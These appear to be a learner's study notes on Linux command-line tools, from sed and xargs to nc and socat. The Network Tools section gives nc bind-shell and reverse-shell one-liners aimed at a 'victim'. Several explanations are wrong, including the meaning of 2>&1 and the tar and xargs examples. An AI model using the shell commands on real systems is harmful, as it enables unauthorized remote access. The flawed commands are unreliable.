@@ -1,0 +1,111 @@
+Useful Commands, Shortcuts and tips:
+-apropos <keyword>: is used to search for a tool by providing a keyword that is related to what this program does
+
+-unset <variable-name>: is used to unset an environment variable from the current terminal session.
+
+-Ctrl + R then type a keyword or a part of keyword: this will search the history of commands you ran before and it get you the closest command to the words you typed and if you press enter it will run this command.
+
+-Difference Between "ls ; ls" and "ls && ls":
+with the first one it will run both commands even if the first command failed or produced an error but on the other hand the later one if the first command failed to execute properly or had some issue while executing or even produced an error the later command won't execute.
+
+-passing output of a command as arguments to another argument we can use the xargs command, for example:
+ "ls -l | xargs rm"
+this command will rm all files that ls produced as output
+
+-Sed Command (short for stream editor):
+mainly used to create in memory stream in which you can tell it to edit and subistute words without modifying the original file and without having to open the file.
+Syntax:
+ sed 's/<word-to-search-for>/<word-to-subsitute-with>/[g]' <file>
+"s" stands for subistitute and "g" is optional and stands for global and does the subs globally on each finding.
+
+-split command:
+is the opposite of cat (concating files) it splits the input file into multiple output files based on line numbers
+Syntax:
+ split -l <no-lines-to-split-after> <input-file> <output-file>
+
+
+-cut command:
+is used to split its string input into multiple strings based on some delimeter
+Syntax:
+ cut <filename> -d '<delimiter>' -f <field-no-starts-from-1>
+
+-awk command:
+is used to filter strings based on some expresion that you specify using a language.
+
+-sort and uniq: as the name suggests the first one sorts output and the other one removes duplicates from output
+
+-comm <file1> <file2>:
+is a tool to compare files and gives you the common among them and and differences as well.
+
+Process Management:
+ NOTE: when you run a command from the terminal and you close the terminal, by default all the sub processes that you created and are running in the background will be shutdown by sending them a hup signal and in order to prevent this you can use the following command:
+ 	nohup <command-to-execute>
+ another way to achieve the same you can use a command called disown which from its name you can infer what it does it simply disowns the terminal process as an owner process of the last created background job and the usage is similar to "bg" and "fg":
+ 	disown [job-id]
+
+
+killall <command-name>: is a command kill all processes with the given name
+
+File Monitoring:
+we can use the tail command to monitor a file and watch what it contains as it's being written to disk by using the -f option for example:
+	tail -f /var/log/apache2/access.log
+
+watch -n <seconds-to-refresh> -d <command-to-watch>: is used to continualy run a command and watch its values changes and -d here is to highlight the values changed.
+
+Downloading Files:
+wget <url> -O <new-file-name>
+NOTE: one big advantage to use wget is that it downloads the file with the same timestamp or the same date that it got created on the server.
+
+axel <url>: is used to download large files as it has the option to open multiple connections with the server using the -n <no-connections> option.
+
+Bash enviornment:
+alias <alias>='<command-set-the-alias-for>'
+
+NOTE: we can determine what types of commands will be saved in the history and we can tell bash to ignore certain types of commands using the environment variable HISTCONTROL, for example:
+"export HISTCONTROL=ignoreboth"
+options available:
+    ignorespace — ignore commands that start with a space
+    ignoredups — ignore duplicate commands and
+    ignoreboth — both of the above.
+
+
+General NOTE: when you see this symbols after a command that is going to run in the shell "2>&1" the one and the two are the standard output and standard error of a process so this syntax means redirect standard error to standard input.
+
+Open ssl suite:
+is a toolkit meant for doing anything related to ssl/tls encryption like encrypting files, generating certificates, ...etc.
+-one of the tools available within this toolkit is s_client it's mainly used to connect to a host using ssl/tls and the syntax is as follows:
+	openssl s_client -connect localhost:port
+
+NOTE about more command: more command has an interactive mode that will allow you to open the currently shown file in a default text editor for example in vim.
+
+
+Network Tools:
+-nc: is an easy to use on both ends (client and server) tool you simply spwan a server on one end and connect it from the other end and simply start sending and receiving data. you can send files as well by simply redirecting in and out (< and >).
+-we can also use this tool to create
+bind shell: make the victim the server and make it execute the shell when i connect
+ex: nc -lnvp <port> -e /bin/bash
+
+reverse shell: create the server on the attacker machine and make the victim connect to my machine
+ex: on the victim machine you can execute "nc -nv <ip> <port> -e /bin/bash"
+
+socat:
+basic syntax for listening for incoming connections:
+	socat TCP4-LISTEN:4444 stdout
+-first arg is the protocol type either tcp or udp
+-4 means ipv4
+-then hyphen then the action
+-after a colon the port number
+-then where do you want to redirect the output
+
+for the client:
+	socat - TCP4:192.168.1.2:4444
+- the hyphen here refers to stdin
+- protocol to use then ip then port
+
+NOTE: in linux bash we can use the - character to make a command take input from stdin for example:
+	tar -xvf | -
+is saying take whatever i pass you as an input from stdin and consider it an archive and extract it out.
+
+NOTE: one of the differences between nc and socat is that socat on listening creates a multi-connection server so that you can connect more than once and more than one client.
+
+NOTE: one of the advantages of using socat instead of nc is that you can use an encrypted connection between the client and the server.
